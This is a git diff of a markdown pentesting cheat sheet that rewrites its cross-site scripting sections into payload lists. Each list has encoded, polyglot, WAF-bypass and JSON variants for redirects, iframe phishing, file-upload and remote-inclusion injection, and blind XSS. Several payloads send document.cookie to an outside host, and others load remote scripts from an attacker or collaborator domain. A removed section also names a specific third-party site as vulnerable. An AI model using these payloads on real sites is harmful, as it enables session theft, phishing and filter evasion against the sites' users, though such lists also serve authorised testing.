@@ -340,68 +340,91 @@ http://leettime.net/xsslab1/
   <script>alert(1)</script>
   ```
 
-## 4. URL Redirection
-- Instead of `alert(1)`, use URL redirection.
-- If it redirects to `bing.com`, it is vulnerable.
-  ```html
-  <script>document.location.href="http://bing.com"</script>
-  ```
-  Example vulnerable URL:
-  ```
-  http://www.woodlandwordwide.com/wnew.faces/tiles/page/search.jsp?searchkey=<script>document.location.href="http://bing.com"</script>
-  ```
+### 4. URL Redirection via XSS
+**Payload:**
+Original Payload: <script>document.location.href="http://bing.com"</script>  
+URL-Encoded Payload: %3Cscript%3Edocument.location.href%3D%22http%3A%2F%2Fbing.com%22%3C%2Fscript%3E  
+Polyglot Payload: "><svg/onload=location.href='http://bing.com'>  
+WAF-bypass Polyglot: <img src=x onerror=location.href='//bing.com'>  
+JSON Payload: {"x":"</script><script>location.href='http://bing.com'</script>"}
 
-## 5. Phishing via XSS
-- Instead of `alert(1)`, use an iframe:
-  ```html
-  <iframe src="http://bing.com" height="100%" width="100%"></iframe>
-  ```
+---
 
-## 6. Cookie Stealing via XSS
-- Victim's website transfers cookies to the attacker's site:
-  ```html
-  <script>document.location.href="http://bing.com/p/?page="+document.cookie</script>
-  ```
+### 5. Phishing via XSS (Iframe)
+**Payload:**
+Original Payload: <iframe src="http://bing.com" height="100%" width="100%"></iframe>  
+URL-Encoded Payload: %3Ciframe%20src%3D%22http%3A%2F%2Fbing.com%22%20height%3D%22100%25%22%20width%3D%22100%25%22%3E%3C%2Fiframe%3E  
+Polyglot Payload: "><iframe src=//bing.com>  
+WAF-bypass Polyglot: <object data=//bing.com></object>  
+JSON Payload: {"x":"</iframe><iframe src='//bing.com'>"}
 
-## 7. XSS Through File Uploading
-### Method 1:
-- The `file_name` parameter is reflecting in the **view-source** (e.g., `abc.jpeg`).
-- Attack by injecting scripts into the filename.
-- Use **Intruder** with common payloads.
+---
 
-### Method 2:
-- Upload a file containing an XSS script.
-- Access the file to trigger the payload.
+### 6. Cookie Stealing via XSS
+**Payload:**
+Original Payload: <script>document.location.href="http://bing.com/p/?page="+document.cookie</script>  
+URL-Encoded Payload: %3Cscript%3Edocument.location.href%3D%22http%3A%2F%2Fbing.com%2Fp%2F%3Fpage%3D%22%2Bdocument.cookie%3C%2Fscript%3E  
+Polyglot Payload: "><img src=x onerror=location='//bing.com/?c='+document.cookie>  
+WAF-bypass Polyglot: <svg/onload=fetch('//bing.com/?c='+document.cookie)>  
+JSON Payload: {"x":"</script><script>location='//bing.com/?c='+document.cookie</script>"}
 
-## 8. XSS Through RFI Vulnerability
-- If an application has RFI vulnerability, host an XSS script on the attacker's server:
-  ```
-  http://10.10.11.24/xss.html  # Contains XSS payload
-  ```
-- Execute via a vulnerable endpoint:
-  ```
-  http://abc.com/cmn/js/ajax.php?url=http://10.10.11.24/xss.html
-  ```
+---
 
-## 9. Self-XSS to Reflected XSS
-- Copy the vulnerable **HTML response** from Burp Suite.
-- Save it as an HTML file and open it in Firefox.
-- Instead of `alert(1)`, use:
-  ```html
-  document.location.href="http://bing.com"
-  ```
-- Example:
-  ```
-  /@213dewf it is reflecting in browser → add XSS script:
-  /@213dewf"><script>alert(1)</script>
-  ```
+### 7. XSS via File Upload (Filename Injection)
+**Payload:**
+Original Payload: abc"><script>alert(1)</script>.jpeg  
+URL-Encoded Payload: abc%22%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E.jpeg  
+Polyglot Payload: abc"><svg/onload=alert(1)>.jpeg  
+WAF-bypass Polyglot: abc"><img src=x onerror=alert(1)>.jpeg  
+JSON Payload: {"filename":"abc\"><script>alert(1)</script>.jpeg"}
+
+---
+
+### 7. XSS via File Upload (Malicious File Content)
+**Payload:**
+Original Payload: <script>alert(1)</script>  
+URL-Encoded Payload: %3Cscript%3Ealert(1)%3C%2Fscript%3E  
+Polyglot Payload: <svg/onload=alert(1)>  
+WAF-bypass Polyglot: <img src=x onerror=alert(1)>  
+JSON Payload: {"file":"<script>alert(1)</script>"}
+
+---
+
+### 8. XSS via Remote File Inclusion (RFI)
+**Payload:**
+Original Payload: <script>alert(1)</script>  
+URL-Encoded Payload: %3Cscript%3Ealert(1)%3C%2Fscript%3E  
+Polyglot Payload: <svg/onload=alert(1)>  
+WAF-bypass Polyglot: <body onload=alert(1)>  
+JSON Payload: {"url":"http://attacker/xss.html"}
+
+---
+
+### 9. Self-XSS to Reflected XSS
+**Payload:**
+Original Payload: <script>document.location.href="http://bing.com"</script>  
+URL-Encoded Payload: %3Cscript%3Edocument.location.href%3D%22http%3A%2F%2Fbing.com%22%3C%2Fscript%3E  
+Polyglot Payload: "><svg/onload=location.href='http://bing.com'>  
+WAF-bypass Polyglot: <img src=x onerror=location.href='//bing.com'>  
+JSON Payload: {"x":"</script><script>location.href='//bing.com'</script>"}
+
+---
+
+### 10. Blind XSS
+**Payload:**
+Original Payload: <script src="https://your-collaborator-domain/xss.js"></script>  
+URL-Encoded Payload: %3Cscript%20src%3D%22https%3A%2F%2Fyour-collaborator-domain%2Fxss.js%22%3E%3C%2Fscript%3E  
+Polyglot Payload: "><script src=//collab/x.js></script>  
+WAF-bypass Polyglot: <img src=x onerror=import('//collab/x.js')>  
+JSON Payload: {"x":"<script src='//collab/x.js'></script>"}
+```
 
 ## 10. Blind XSS Vulnerability
 - Use **Hunter** for detection.
 ```
 ```
 ---
-
+```
 # Host Header Injection
 ## 1. Overview
 - Exploiting host header injection in **virtual hosting environments**.
